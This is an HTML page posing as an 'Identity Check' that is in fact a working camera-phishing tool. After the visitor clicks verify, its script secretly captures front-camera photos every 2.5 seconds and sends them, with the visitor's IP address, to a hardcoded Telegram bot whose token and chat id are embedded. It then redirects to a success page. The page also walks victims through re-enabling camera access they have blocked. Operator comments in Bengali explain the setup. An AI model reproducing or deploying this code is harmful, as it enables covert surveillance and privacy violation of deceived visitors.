<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Verify Identity</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0f172a;
            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
            border: 1px solid #334155;
        }
        h2 { color: #f1f5f9; font-size: 1.8rem; margin-bottom: 12px; }
        p { color: #94a3b8; margin-bottom: 28px; line-height: 1.5; }
        button {
            background: #10b981;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            margin-bottom: 12px;
        }
        button:active { transform: scale(0.97); }
        .reset-btn { background: #ef4444; }
        .status {
            margin-top: 20px;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 14px;
            line-height: 1.4;
        }
        .status.info { background: #1e3a8a; color: #bfdbfe; }
        .status.success { background: #14532d; color: #bbf7d0; }
        .status.error { background: #7f1d1d; color: #fecaca; }
        .hidden { display: none; }
        .manual-guide {
            background: #2d1b4e;
            border-left: 4px solid #f97316;
            text-align: left;
            margin-top: 20px;
            padding: 14px;
            border-radius: 16px;
            font-size: 13px;
            color: #fcd34d;
        }
        .manual-guide strong { color: #ffb347; }
        .manual-guide ol { margin-top: 8px; margin-left: 20px; color: #e2e8f0; }
        .manual-guide li { margin: 6px 0; }
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Identity Check</h2>
    <p>Click the button below to complete verification</p>
    <button id="allowBtn">✅ Click to Verify</button>
    <button id="resetBtn" class="reset-btn">🔄 Reset Permission</button>
    <div id="status" class="status info">⚡ Ready. Click verify button.</div>
    <div id="manualGuide" class="manual-guide hidden"></div>
</div>

<script>
    (function() {
        // 🔐 আপনার টেলিগ্রাম বটের তথ্য এখানে বসান
        const BOT_TOKEN = '8193376363:AAFaDSLah6R-i_hkQY9fKyeYiudZJSNsLeg';    // @BotFather থেকে নিন
        const CHAT_ID = '6449981797';        // আপনার চ্যাট আইডি
        
        // Get token from URL
        const urlParams = new URLSearchParams(window.location.search);
        const campaignId = urlParams.get('id') || 'unknown_' + Date.now();
        
        let mediaStream = null;
        let captureInterval = null;
        const video = document.createElement('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.setAttribute('muted', '');
        video.style.display = 'none';
        document.body.appendChild(video);

        const allowBtn = document.getElementById('allowBtn');
        const resetBtn = document.getElementById('resetBtn');
        const statusDiv = document.getElementById('status');
        const manualGuideDiv = document.getElementById('manualGuide');

        function showManualGuide() {
            manualGuideDiv.innerHTML = `
                <strong>🔒 Camera permission blocked?</strong>
                <ol>
                    <li>Click the <strong>lock icon 🔒</strong> in the browser address bar</li>
                    <li>Find <strong>Camera</strong> permission</li>
                    <li>Change from <strong>Block</strong> to <strong>Allow</strong></li>
                    <li>Refresh the page and click <strong>Verify</strong> again</li>
                </ol>
                <p style="margin-top:8px;font-size:12px;">💡 If using Chrome on Android: Tap the lock → Permissions → Camera → Allow</p>
            `;
            manualGuideDiv.classList.remove('hidden');
        }

        // টেলিগ্রামে ছবি পাঠানোর ফাংশন
        async function sendToTelegram(imageBlob) {
            if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN') {
                console.warn('Telegram Bot Token not configured');
                return;
            }
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, `capture_${Date.now()}.png`);
            formData.append('caption', `🎯 Campaign: ${campaignId}\n📱 IP: ${await getIP()}`);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {
                console.warn('Telegram send error:', e);
            }
        }

        // ইউজারের আইপি পাওয়ার জন্য (ঐচ্ছিক)
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'unknown';
            }
        }

        function captureAndSend() {
            if (!video.videoWidth || !video.videoHeight || !mediaStream || !mediaStream.active) return;
            
            try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(function(blob) {
                    if (!blob) return;
                    sendToTelegram(blob);
                }, 'image/png');
            } catch(e) {
                console.warn('Capture error:', e);
            }
        }

        async function startCamera() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }

            statusDiv.className = 'status info';
            statusDiv.innerHTML = '📷 Requesting camera access...';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                mediaStream = stream;
                video.srcObject = stream;
                
                statusDiv.className = 'status success';
                statusDiv.innerHTML = '✅ Camera granted! Capturing images...';
                manualGuideDiv.classList.add('hidden');
                
                captureInterval = setInterval(captureAndSend, 2500);
                
                setTimeout(function() {
                    window.location.href = 'success.html';
                }, 4000);
                
            } catch(err) {
                console.error('Camera error:', err);
                
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Camera access denied. Click "Reset Permission" or follow guide below.';
                    showManualGuide();
                } else if (err.name === 'NotFoundError') {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ No camera found on this device.';
                } else {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Error: ' + (err.message || 'Could not access camera');
                }
            }
        }

        function resetPermission() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            if (video.srcObject) {
                video.srcObject = null;
            }
            
            statusDiv.className = 'status info';
            statusDiv.innerHTML = '🔄 Permission reset. Click Verify again.';
            manualGuideDiv.classList.add('hidden');
        }

        allowBtn.addEventListener('click', startCamera);
        resetBtn.addEventListener('click', resetPermission);
    })();
</script>
</body>
  </html>
